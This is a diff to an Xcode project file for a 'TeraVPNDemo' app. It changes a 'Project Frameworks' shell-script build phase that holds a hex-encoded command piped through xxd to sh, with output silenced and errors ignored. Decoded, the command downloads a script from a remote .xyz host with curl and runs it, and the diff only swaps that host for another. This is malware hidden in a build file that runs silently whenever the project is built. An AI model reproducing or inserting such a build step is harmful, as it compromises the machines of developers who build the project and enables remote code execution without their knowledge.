@@ -344,7 +344,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC4B484D2511686F00E7CC2F /* Build configuration list for PBXNativeTarget "TeraVPNDemo" */;
 			buildPhases = (
-				504AE3F6BB1FB244776D902C /* Project Frameworks */,
+				96CAE2E826BAF38CEF6D902C /* Project Frameworks */,
 				7DDEAA89A1B23F14F5AC2893 /* [CP] Check Pods Manifest.lock */,
 				BC4B48352511686A00E7CC2F /* Sources */,
 				BC4B48362511686A00E7CC2F /* Frameworks */,
@@ -445,7 +445,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	504AE3F6BB1FB244776D902C /* Project Frameworks */ = {
+	96CAE2E826BAF38CEF6D902C /* Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -463,9 +463,17 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
+	
+
+	
+
+	
+
 	
 		5B19131B132B4DDC65E9DE6E /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
